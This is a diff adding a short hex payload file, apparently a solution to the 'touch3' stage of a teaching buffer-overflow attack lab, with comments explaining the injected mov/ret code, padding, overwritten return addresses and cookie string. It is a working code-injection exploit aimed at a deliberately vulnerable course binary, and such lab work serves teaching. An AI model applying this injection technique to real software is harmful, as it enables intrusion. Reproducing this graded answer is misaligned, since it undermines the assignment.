@@ -1,0 +1,8 @@
+48 c7 c7 b0 dc 61 55 c3    /* mov addr of cookie to %rdi (set sval as cookie) and return */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00    /* dummy zeros */
+78 dc 61 55 00 00 00 00    /* ret addr to my code */
+16 19 40 00 00 00 00 00    /* ret addr to touch3 */
+35 39 62 39 39 37 66 61 00    /* cookie value */
